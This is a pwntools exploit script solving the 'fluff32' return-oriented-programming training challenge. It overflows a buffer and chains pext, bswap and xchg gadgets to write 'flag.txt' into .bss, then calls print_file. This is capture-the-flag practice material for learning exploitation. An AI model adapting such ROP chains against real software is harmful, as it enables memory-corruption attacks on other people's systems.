#! /usr/bin/env python
from pwn import *

program = "./fluff32"
proc = process(program)

elf_prog = ELF(program)

#pid = gdb.attach(proc, '''
#    set pagination off
#    set disassembly-flavor intel
#    b * 0x8048555
#    ''')

print_file = elf_prog.plt['print_file'] 

pext = elf_prog.symbols['questionableGadgets'] 
# mov    eax,ebp 
# mov    ebx,0xb0bababa
# pext   edx,ebx,eax
# mov    eax,0xdeadbeef
# ret 
xchg = elf_prog.symbols['questionableGadgets'] + 18
# xchg   BYTE PTR [ecx],dl
# ret    
bswap = elf_prog.symbols['questionableGadgets'] + 21
# pop    ecx
# bswap  ecx
# ret
bss = elf_prog.bss(8)
#.bss section address
gadget1 = 0x080485bb # pop ebp; ret;

payload = b'A'*44
# 0xb0bababa
#                                             
#                          1011 1010 1011 1010 # baba
#                          
#                          0100 1011 0100 1011 # f_mask(0x4b4b)
#                                    0110 0110 # f(0x66)
#
#                               0100 1101 1101 # l_mask(0x6dd)
#                                    0110 1100 # l(0x6c)
#
#                          0101 1101 0100 0110 # a_mask(0x5d46)  
#                                    0110 0001 # a(0x61)
#
#                          0100 1011 0101 1010 # g_mask(0x4b5a)   
#                                    0110 0111 # g(0x67)

#                               0101 1101 1011 # ._mask(0x5db)
#                                    0010 1110 # .(0x2e)

#                          0100 1010 1100 1101 # t_mask(0x4acd)
#                                    0111 0100 # t(0x74)
#
#                          0101 1010 1100 0101 # x_mask(0x5ac5)
#                                    0111 1000 # x(0x78)
f_mask = 0x04b4b
l_mask = 0x06dd
a_mask = 0x05d46
g_mask = 0x04b5a
dot_mask = 0x05db
t_mask = 0x04acd
x_mask = 0x05ac5
payload += p32(bswap) + p32(bss, endian='big') + p32(gadget1) + p32(f_mask) + p32(pext) + p32(xchg)
payload += p32(bswap) + p32(bss+1, endian='big') + p32(gadget1) + p32(l_mask) + p32(pext) + p32(xchg)
payload += p32(bswap) + p32(bss+2, endian='big') + p32(gadget1) + p32(a_mask) + p32(pext) + p32(xchg)
payload += p32(bswap) + p32(bss+3, endian='big') + p32(gadget1) + p32(g_mask) + p32(pext) + p32(xchg)
payload += p32(bswap) + p32(bss+4, endian='big') + p32(gadget1) + p32(dot_mask) + p32(pext) + p32(xchg)
payload += p32(bswap) + p32(bss+5, endian='big') + p32(gadget1) + p32(t_mask) + p32(pext) + p32(xchg)
payload += p32(bswap) + p32(bss+6, endian='big') + p32(gadget1) + p32(x_mask) + p32(pext) + p32(xchg)
payload += p32(bswap) + p32(bss+7, endian='big') + p32(gadget1) + p32(t_mask) + p32(pext) + p32(xchg)
# push [ebp+para1], set para1 to 0
payload += p32(print_file) + 'A'*4 + p32(bss)
print(payload)

proc.recvuntil("> ")
proc.sendline(payload)
proc.interactive()
